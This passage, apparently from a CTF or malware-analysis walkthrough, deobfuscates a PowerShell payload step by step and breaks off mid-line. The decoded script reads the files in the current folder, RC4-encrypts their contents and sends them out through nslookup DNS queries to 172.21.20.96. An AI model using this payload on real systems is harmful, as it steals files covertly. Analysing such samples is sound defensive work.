$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;;+&#125;+$&#123;)&#125;$&#123;]&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;![/&#125;$&#123;&#x27;$[&#125;  +  $&#123;)&#125;$&#123;$] &#125;$&#123;@$/&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;@$/&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;![/&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;$] &#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;&#x27;$[&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;+$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;  +$&#123;)&#125;$&#123;![/&#125;$&#123;;+&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;;+&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;  +  $&#123;)&#125;$&#123;![/&#125;$&#123;$] &#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;&#x27;$[&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;+$&#123;)&#125;$&#123;![/&#125;$&#123;;+&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;&#x27;$[&#125;+$&#123;)&#125;$&#123;![/&#125;$&#123;](&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;@$/&#125;$&#123;&#x27;$[&#125;+$&#123;)&#125;$&#123;![/&#125;$&#123;~=&#125;  +  $&#123;)&#125;$&#123;![/&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;@[&#125;$&#123;~&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;@$/&#125;$&#123;@$/&#125;  +  $&#123;)&#125;$&#123;]&#125;$&#123;~=&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;@$/&#125;$&#123;&#x27;$[&#125;  +  $&#123;)&#125;$&#123;$] &#125;$&#123;@$/&#125;+$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;$] &#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;@[&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;+$&#123;)&#125;$&#123;![/&#125;$&#123;;+&#125;  +$&#123;)&#125;$&#123;![/&#125;$&#123;;+&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;;+&#125;+  $&#123;)&#125;$&#123;![/&#125;$&#123;@[&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;@$/&#125;$&#123;&#x27;$[&#125;+$&#123;)&#125;$&#123;![/&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;![/&#125;$&#123;~&#125;+$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;@$/&#125;$&#123;@$/&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;  +$&#123;)&#125;$&#123;![/&#125;$&#123;$] &#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;&#x27;$[&#125;  +$&#123;)&#125;$&#123;![/&#125;$&#123;~=&#125;+$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;@[&#125;$&#123;~&#125;+$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;@$/&#125;$&#123;@$/&#125;+$&#123;)&#125;$&#123;]&#125;$&#123;~=&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;&#x27;$[&#125;  +$&#123;)&#125;$&#123;![/&#125;$&#123;$] &#125;  +$&#123;)&#125;$&#123;![/&#125;$&#123;;+&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;;+&#125;+  $&#123;)&#125;$&#123;![/&#125;$&#123;@[&#125;+$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;@$/&#125;$&#123;&#x27;$[&#125;  +  $&#123;)&#125;$&#123;![/&#125;$&#123;~=&#125;+$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;@[&#125;$&#123;$] &#125;  +  $&#123;)&#125;$&#123;$] &#125;$&#123;@$/&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;![/&#125;  +$&#123;)&#125;$&#123;![/&#125;$&#123;~&#125;+$&#123;)&#125;$&#123;]&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;  +  $&#123;)&#125;$&#123;![/&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;&#x27;$[&#125;$&#123;~&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;](&#125;  +  $&#123;)&#125;$&#123;@$/&#125;$&#123;&#x27;$[&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;$] &#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;![/&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;$] &#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;;+&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~&#125;  +$&#123;)&#125;$&#123;![/&#125;$&#123;;+&#125;+$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;;+&#125;+$&#123;)&#125;$&#123;![/&#125;$&#123;@[&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;@$/&#125;$&#123;&#x27;$[&#125;  +  $&#123;)&#125;$&#123;![/&#125;$&#123;![/&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;@$/&#125;$&#123;@$/&#125;  +$&#123;)&#125;$&#123;![/&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;+$&#123;)&#125;$&#123;![/&#125;$&#123;~&#125;+$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;![/&#125;+  $&#123;)&#125;$&#123;![/&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;![/&#125;+$&#123;)&#125;$&#123;$] &#125;$&#123;@$/&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;$] &#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;@[&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;+$&#123;)&#125;$&#123;![/&#125;$&#123;;+&#125;+  $&#123;)&#125;$&#123;![/&#125;$&#123;;+&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;;+&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;](&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;$] &#125;  +  $&#123;)&#125;$&#123;![/&#125;$&#123;~=&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;+  $&#123;)&#125;$&#123;![/&#125;$&#123;$] &#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;~&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;+$&#123;)&#125;$&#123;![/&#125;$&#123;;+&#125;+$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;$] &#125;+$&#123;)&#125;$&#123;![/&#125;$&#123;$] &#125;  +$&#123;)&#125;$&#123;![/&#125;$&#123;@$/&#125;+  $&#123;)&#125;$&#123;![/&#125;$&#123;~=&#125;  +  $&#123;)&#125;$&#123;![/&#125;$&#123;~=&#125;+$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;@[&#125;$&#123;~&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;;+&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;$] &#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;&#x27;$[&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;~=&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;](&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;](&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;@[&#125;+$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;  +$&#123;)&#125;$&#123;![/&#125;$&#123;$] &#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;@[&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;@[&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;]&#125;$&#123;~=&#125;+$&#123;)&#125;$&#123;]&#125;$&#123;$] &#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;![/&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;@$/&#125;$&#123;](&#125;  +  $&#123;)&#125;$&#123;![/&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;;+&#125;  +  $&#123;)&#125;$&#123;$] &#125;$&#123;@$/&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;![/&#125;+  $&#123;)&#125;$&#123;]&#125;$&#123;~=&#125;+$&#123;)&#125;$&#123;~&#125;$&#123;![/&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;![/&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;@[&#125;$&#123;$] &#125;+$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;;+&#125;  +$&#123;)&#125;$&#123;]&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;;+&#125;  +$&#123;)&#125;$&#123;![/&#125;$&#123;~&#125;  +  $&#123;)&#125;$&#123;![/&#125;$&#123;@$/&#125;+$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;@[&#125;$&#123;$] &#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;;+&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;$] &#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;&#x27;$[&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;~=&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;~=&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;](&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;](&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;@[&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;+  $&#123;)&#125;$&#123;![/&#125;$&#123;$] &#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;@[&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;@[&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;  +  $&#123;)&#125;$&#123;]&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;]&#125;$&#123;$] &#125;+$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;![/&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;@$/&#125;$&#123;](&#125;  +$&#123;)&#125;$&#123;![/&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;;+&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;@[&#125;$&#123;$] &#125;  |  $&#123;;@!&#125;  &quot;  |&amp;  $&#123;;@!&#125;    </span><br></pre></td></tr></table></figure>

<p>Then decrypt it to get:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[CHar]36+[CHar]100+[CHar]61  +[CHar]34  +[CHar]49  +[CHar]55+  [CHar]50  +[CHar]46+[CHar]50+  [CHar]49  +[CHar]46+[CHar]50  +  [CHar]48+[CHar]46+[CHar]57+[CHar]54  +[CHar]34  +[CHar]59  +[CHar]32+  [CHar]36+[CHar]115  +  [CHar]61+  [CHar]52  +  [CHar]59+  [CHar]32  +  [CHar]36+[CHar]98  +[CHar]61+  [CHar]53  +  [CHar]55  +  [CHar]59  +[CHar]32  +[CHar]71+  [CHar]101+  [CHar]116  +[CHar]45  +[CHar]67+  [CHar]104+[CHar]105+  [CHar]108  +[CHar]100  +[CHar]73  +  [CHar]116+[CHar]101+[CHar]109+  [CHar]32  +  [CHar]34  +[CHar]46  +[CHar]34+  [CHar]32+  [CHar]124+  [CHar]32  +[CHar]70+  [CHar]111+[CHar]114+[CHar]101  +[CHar]97+[CHar]99+[CHar]104+[CHar]45+  [CHar]79+[CHar]98  +[CHar]106+  [CHar]101  +[CHar]99  +  [CHar]116+  [CHar]32  +[CHar]123  +  [CHar]36  +  [CHar]97+[CHar]61+  [CHar]91  +  [CHar]83  +  [CHar]121+[CHar]115  +  [CHar]116+[CHar]101+  [CHar]109  +  [CHar]46+[CHar]67+  [CHar]111+  [CHar]110+  [CHar]118+  [CHar]101+  [CHar]114+[CHar]116  +[CHar]93  +[CHar]58+  [CHar]58+  [CHar]84+[CHar]111+  [CHar]66+[CHar]97  +[CHar]115+  [CHar]101+[CHar]54  +  [CHar]52+[CHar]83  +[CHar]116  +  [CHar]114+  [CHar]105+[CHar]110+  [CHar]103+  [CHar]40+  [CHar]36+[CHar]69  +[CHar]110+  [CHar]99  +  [CHar]46+[CHar]71  +[CHar]101  +  [CHar]116  +  [CHar]66+  [CHar]121+[CHar]116+[CHar]101  +[CHar]115+[CHar]40  +[CHar]36  +  [CHar]95  +  [CHar]46+  [CHar]78+  [CHar]97  +[CHar]109  +[CHar]101+[CHar]41+  [CHar]41  +[CHar]59+  [CHar]32  +[CHar]36+[CHar]82+[CHar]61  +  [CHar]123+[CHar]36  +[CHar]68  +  [CHar]44  +[CHar]36  +  [CHar]75  +[CHar]61  +[CHar]36+[CHar]65+[CHar]114  +  [CHar]103  +[CHar]115+[CHar]59  +[CHar]36+  [CHar]83+[CHar]61+  [CHar]48+[CHar]46+  [CHar]46  +  [CHar]50  +  [CHar]53  +[CHar]53  +[CHar]59  +  [CHar]48  +[CHar]46+[CHar]46  +  [CHar]50+  [CHar]53+  [CHar]53  +[CHar]124  +[CHar]37+[CHar]123  +[CHar]36  +  [CHar]74  +[CHar]61  +[CHar]40+[CHar]36+[CHar]74+[CHar]43  +  [CHar]36  +  [CHar]83+  [CHar]91+  [CHar]36+[CHar]95+[CHar]93+  [CHar]43  +  [CHar]36  +  [CHar]75  +[CHar]91  +[CHar]36  +[CHar]95+  [CHar]37  +[CHar]36  +  [CHar]75  +  [CHar]46+[CHar]76  +[CHar]101+[CHar]110  +  [CHar]103+  [CHar]116  +[CHar]104  +[CHar]93+[CHar]41+  [CHar]37+[CHar]50+[CHar]53+[CHar]54  +  [CHar]59  +  [CHar]36+[CHar]83+  [CHar]91+  [CHar]36  +  [CHar]95  +[CHar]93  +  [CHar]44  +  [CHar]36  +[CHar]83+[CHar]91  +[CHar]36+  [CHar]74+  [CHar]93  +[CHar]61+[CHar]36+  [CHar]83+[CHar]91+[CHar]36  +  [CHar]74  +[CHar]93+  [CHar]44  +  [CHar]36  +  [CHar]83  +[CHar]91  +[CHar]36  +[CHar]95  +  [CHar]93  +[CHar]125+[CHar]59  +  [CHar]36+  [CHar]68+  [CHar]124+[CHar]37  +  [CHar]123  +[CHar]36  +[CHar]73+[CHar]61  +[CHar]40+  [CHar]36+  [CHar]73  +  [CHar]43+  [CHar]49+  [CHar]41  +  [CHar]37  +[CHar]50  +[CHar]53+[CHar]54+  [CHar]59+  [CHar]36+  [CHar]72  +[CHar]61+[CHar]40+  [CHar]36  +[CHar]72+  [CHar]43  +[CHar]36+[CHar]83+  [CHar]91  +  [CHar]36+[CHar]73+[CHar]93+[CHar]41  +  [CHar]37  +[CHar]50+  [CHar]53  +  [CHar]54  +[CHar]59+[CHar]36  +[CHar]83+[CHar]91+  [CHar]36  +[CHar]73+[CHar]93+[CHar]44+  [CHar]36+  [CHar]83+  [CHar]91+  [CHar]36+  [CHar]72  +[CHar]93  +  [CHar]61  +[CHar]36+[CHar]83+  [CHar]91  +  [CHar]36+[CHar]72+[CHar]93+  [CHar]44  +  [CHar]36+  [CHar]83  +[CHar]91+  [CHar]36  +  [CHar]73+[CHar]93  +  [CHar]59  +  [CHar]36  +  [CHar]95  +[CHar]45+  [CHar]98+[CHar]120+  [CHar]111  +  [CHar]114+  [CHar]36+  [CHar]83+[CHar]91+  [CHar]40+  [CHar]36+[CHar]83+[CHar]91+  [CHar]36+  [CHar]73  +[CHar]93  +[CHar]43  +  [CHar]36+  [CHar]83  +[CHar]91+[CHar]36  +[CHar]72+[CHar]93  +  [CHar]41+  [CHar]37  +  [CHar]50+  [CHar]53  +  [CHar]54  +[CHar]93+  [CHar]125+  [CHar]125+  [CHar]59+  [CHar]32  +[CHar]36  +  [CHar]69  +[CHar]110  +  [CHar]99+  [CHar]32  +  [CHar]61  +[CHar]32  +  [CHar]91+[CHar]83  +[CHar]121  +  [CHar]115+  [CHar]116  +  [CHar]101  +[CHar]109+  [CHar]46+[CHar]84+[CHar]101+[CHar]120  +  [CHar]116  +[CHar]46  +  [CHar]69  +  [CHar]110  +  [CHar]99+[CHar]111  +[CHar]100  +  [CHar]105+  [CHar]110  +[CHar]103+  [CHar]93+[CHar]58+[CHar]58+  [CHar]65  +  [CHar]83+  [CHar]67+[CHar]73+  [CHar]73  +  [CHar]59  +[CHar]32+[CHar]36  +[CHar]112+[CHar]32+  [CHar]61  +[CHar]32+  [CHar]36+  [CHar]69+  [CHar]110+  [CHar]99+  [CHar]46  +[CHar]71  +[CHar]101  +[CHar]116  +[CHar]66+  [CHar]121+[CHar]116+[CHar]101  +  [CHar]115+[CHar]40  +[CHar]39+[CHar]91+  [CHar]83  +  [CHar]121  +[CHar]115  +  [CHar]116  +  [CHar]101  +[CHar]109+  [CHar]46  +  [CHar]73+[CHar]79+  [CHar]46+  [CHar]70+[CHar]105+  [CHar]108+  [CHar]101  +[CHar]93  +  [CHar]58+  [CHar]58+  [CHar]82+  [CHar]101  +  [CHar]97  +[CHar]100+  [CHar]65+  [CHar]108  +  [CHar]108+[CHar]66  +[CHar]121+[CHar]116  +  [CHar]101  +  [CHar]115  +  [CHar]40  +  [CHar]36  +[CHar]95+[CHar]46  +[CHar]70+[CHar]117+[CHar]108+[CHar]108+[CHar]78  +  [CHar]97  +  [CHar]109  +  [CHar]101+  [CHar]41  +[CHar]39  +  [CHar]41  +  [CHar]59+[CHar]32  +  [CHar]36  +[CHar]122  +[CHar]32+  [CHar]61  +[CHar]32  +  [CHar]36+  [CHar]69+  [CHar]110+  [CHar]99  +[CHar]46  +[CHar]71  +[CHar]101  +  [CHar]116  +[CHar]66  +  [CHar]121  +[CHar]116+  [CHar]101  +[CHar]115  +[CHar]40+[CHar]91+  [CHar]83  +  [CHar]121+  [CHar]115+  [CHar]116  +[CHar]101+[CHar]109+  [CHar]46  +  [CHar]73+[CHar]79+  [CHar]46  +[CHar]70  +[CHar]105  +  [CHar]108+[CHar]101  +  [CHar]93+  [CHar]58+[CHar]58  +[CHar]82  +  [CHar]101  +[CHar]97+  [CHar]100  +[CHar]65  +[CHar]108  +  [CHar]108  +[CHar]66+[CHar]121+  [CHar]116  +[CHar]101  +[CHar]115+  [CHar]40+[CHar]36  +  [CHar]95  +  [CHar]46  +  [CHar]70  +[CHar]117  +[CHar]108+  [CHar]108  +  [CHar]78+[CHar]97+[CHar]109  +  [CHar]101  +[CHar]41+[CHar]41  +  [CHar]59  +[CHar]32  +[CHar]36  +[CHar]117  +[CHar]32+[CHar]61  +[CHar]32  +  [CHar]40+  [CHar]38  +  [CHar]32+[CHar]36+[CHar]82+[CHar]32  +[CHar]36  +[CHar]122  +[CHar]32+  [CHar]36+[CHar]112  +  [CHar]41+  [CHar]59+[CHar]32+  [CHar]36+[CHar]101  +  [CHar]32  +[CHar]61+[CHar]32+[CHar]91+  [CHar]83  +[CHar]121  +  [CHar]115+[CHar]116+  [CHar]101+[CHar]109  +[CHar]46  +[CHar]67  +[CHar]111  +[CHar]110+[CHar]118  +  [CHar]101+[CHar]114  +  [CHar]116  +  [CHar]93+[CHar]58  +[CHar]58+  [CHar]84  +  [CHar]111+  [CHar]66+[CHar]97  +  [CHar]115  +[CHar]101  +[CHar]54+[CHar]52  +[CHar]83+  [CHar]116  +[CHar]114  +[CHar]105  +[CHar]110  +  [CHar]103+  [CHar]40  +  [CHar]36+[CHar]117  +  [CHar]41  +[CHar]59  +  [CHar]32  +  [CHar]36+  [CHar]108  +  [CHar]61+  [CHar]36+  [CHar]101+  [CHar]46+  [CHar]76  +[CHar]101+[CHar]110+[CHar]103+  [CHar]116+[CHar]104  +  [CHar]59  +  [CHar]32+[CHar]36+  [CHar]114  +[CHar]61+  [CHar]34  +[CHar]34  +[CHar]59  +  [CHar]32  +[CHar]36+  [CHar]110+[CHar]61+  [CHar]48  +  [CHar]59  +  [CHar]32  +  [CHar]119+[CHar]104+[CHar]105+  [CHar]108  +  [CHar]101+[CHar]32  +[CHar]40  +  [CHar]36+[CHar]110+  [CHar]32  +  [CHar]45+[CHar]108  +[CHar]101  +  [CHar]32+[CHar]40+  [CHar]36  +  [CHar]108+[CHar]47  +[CHar]36  +  [CHar]98+[CHar]41  +  [CHar]41  +[CHar]32+[CHar]123  +[CHar]32  +[CHar]36  +  [CHar]99  +  [CHar]61  +  [CHar]36  +[CHar]98  +  [CHar]59+[CHar]32  +[CHar]105  +  [CHar]102  +[CHar]32+[CHar]40  +[CHar]40  +  [CHar]36+  [CHar]110+  [CHar]42  +  [CHar]36  +[CHar]98+[CHar]41  +[CHar]43+[CHar]36  +  [CHar]99  +[CHar]32  +[CHar]45  +[CHar]103+[CHar]116  +  [CHar]32+  [CHar]36+[CHar]108  +[CHar]41+[CHar]32  +  [CHar]123+[CHar]32+  [CHar]36  +  [CHar]99+[CHar]61  +  [CHar]36  +  [CHar]108  +[CHar]45  +[CHar]40+  [CHar]36+  [CHar]110+  [CHar]42+[CHar]36  +  [CHar]98  +  [CHar]41+[CHar]32+[CHar]125  +  [CHar]59  +[CHar]32  +[CHar]36+  [CHar]114  +[CHar]43+[CHar]61+  [CHar]36+  [CHar]101  +  [CHar]46  +[CHar]83+[CHar]117  +  [CHar]98  +  [CHar]115+[CHar]116  +  [CHar]114  +[CHar]105+[CHar]110+  [CHar]103  +[CHar]40+[CHar]36  +[CHar]110+[CHar]42+  [CHar]36  +[CHar]98  +  [CHar]44+  [CHar]32+  [CHar]36+  [CHar]99  +[CHar]41  +[CHar]32+[CHar]43+[CHar]32  +  [CHar]34+  [CHar]46  +  [CHar]34+[CHar]59+  [CHar]32+[CHar]105+[CHar]102  +[CHar]32+[CHar]40+  [CHar]40  +  [CHar]36+  [CHar]110  +  [CHar]37+  [CHar]36  +  [CHar]115  +  [CHar]41  +  [CHar]32+  [CHar]45  +  [CHar]101  +  [CHar]113  +[CHar]32+[CHar]40+[CHar]36+  [CHar]115+[CHar]45  +[CHar]49+  [CHar]41  +  [CHar]41+[CHar]32  +  [CHar]123+  [CHar]32+[CHar]110+[CHar]115+  [CHar]108  +  [CHar]111  +[CHar]111+[CHar]107+[CHar]117  +[CHar]112+[CHar]32  +[CHar]45+  [CHar]116+  [CHar]121+  [CHar]112  +  [CHar]101+  [CHar]61+[CHar]65  +  [CHar]32  +  [CHar]36+[CHar]114  +[CHar]36  +[CHar]97  +  [CHar]46+  [CHar]32  +  [CHar]36+[CHar]100  +  [CHar]59  +[CHar]32+  [CHar]36  +[CHar]114+  [CHar]61+[CHar]34  +[CHar]34  +[CHar]32+  [CHar]125+[CHar]32  +[CHar]36  +[CHar]110  +[CHar]61+  [CHar]36+[CHar]110  +[CHar]43  +  [CHar]49+[CHar]32+[CHar]125  +  [CHar]32  +  [CHar]110+[CHar]115  +  [CHar]108  +  [CHar]111+[CHar]111+[CHar]107  +  [CHar]117+  [CHar]112  +[CHar]32+  [CHar]45+[CHar]116  +  [CHar]121+  [CHar]112+  [CHar]101  +  [CHar]61+  [CHar]65+[CHar]32+  [CHar]36  +  [CHar]114+  [CHar]36  +[CHar]97  +[CHar]46  +  [CHar]32  +  [CHar]36  +[CHar]100  +[CHar]32+  [CHar]125  |  iex  </span><br></pre></td></tr></table></figure>

<p>Finally, when decrypting and formatting, you can get</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$d=&quot;172.21.20.96&quot;; </span><br><span class="line">$s=4; </span><br><span class="line">$b=57; </span><br><span class="line">Get-ChildItem &quot;.&quot; | Foreach-Object &#123;</span><br><span class="line">    $a=[System.Convert]::ToBase64String($Enc.GetBytes($_.Name)); </span><br><span class="line">    $R=&#123;</span><br><span class="line">        $D,$K=$Args;</span><br><span class="line">        $S=0..255;0..255|%&#123;</span><br><span class="line">            $J=($J+$S[$_]+$K[$_%$K.Length])%256;</span><br><span class="line">            $S[$_],$S[$J]=$S[$J],$S[$_]</span><br><span class="line">        &#125;;</span><br><span class="line">        $D|%&#123;</span><br><span class="line">            $I=($I+1)%256;</span><br><span class="line">            $H=($H+$S[$I])%256;</span><br><span class="line">            $S[$I],$S[$H]=$S[$H],$S[$I];</span><br><span class="line">            $_-bxor$S[($S[$I]+$S[$H])%256]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;; </span><br><span class="line">    $Enc = 